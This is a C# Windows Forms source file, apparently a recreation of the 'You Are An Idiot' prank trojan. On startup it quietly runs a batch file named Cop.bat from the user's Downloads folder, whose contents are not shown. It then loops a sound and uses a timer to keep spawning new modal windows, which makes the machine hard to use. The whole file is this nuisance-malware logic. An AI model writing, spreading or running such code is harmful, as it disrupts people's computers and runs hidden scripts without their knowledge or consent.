using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Media;
using System.IO;
using System.Diagnostics;

namespace YouAreAnIdiot
{
    public partial class Form2 : Form
    {
        private SoundPlayer _soundPlayer;
        public Form2()
        {
            InitializeComponent();
            string pathToDownload = Environment.ExpandEnvironmentVariables(@"%USERPROFILE%\Downloads\YouAreAnIdiot\");
            string copy = pathToDownload + "Cop.bat";
            ProcessStartInfo mad = new ProcessStartInfo();
            mad.FileName = copy;
            Process.Start(mad);

            _soundPlayer = new SoundPlayer("yaai.wav");
            _soundPlayer.PlayLooping();


        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            Form1 frm = new Form1();
            frm.BringToFront();
            frm.ShowDialog();
        }
    }
}
